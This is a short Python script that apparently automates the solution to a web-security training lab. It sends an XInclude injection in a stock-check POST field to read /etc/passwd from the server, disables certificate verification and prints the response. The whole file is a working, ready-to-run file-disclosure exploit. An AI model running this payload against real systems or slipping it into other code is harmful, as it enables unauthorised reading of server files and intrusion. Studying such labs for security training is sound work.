from ..utils import *
from urllib.parse import urljoin
from html import unescape
from lxml import etree

import requests


def solve_lab(url, proxies):
    url = urljoin(url, "/product/stock")

    xinclude_namespace = "http://www.w3.org/2001/XInclude"
    xinclude = "{%s}" % xinclude_namespace
    nsmap = {"xi": xinclude_namespace}
    
    foo = etree.Element(f"{xinclude}foo", nsmap=nsmap)
    etree.SubElement(foo, f"{xinclude}include", parse="text", href="file:///etc/passwd")
    foo = etree.tostring(foo).decode()

    data = {
        "productId": foo,
        "storeId": "1"
    }

    print_info(
        f'Injecting an XML external entity with the following POST request to "{url}":\n'
    )
    print(f"{data}\n")

    resp = requests.post(url, proxies=proxies, verify=False, data=data)
    print_success("XXE injection successful with the following response:\n")
    print(f"{resp.text}\n")
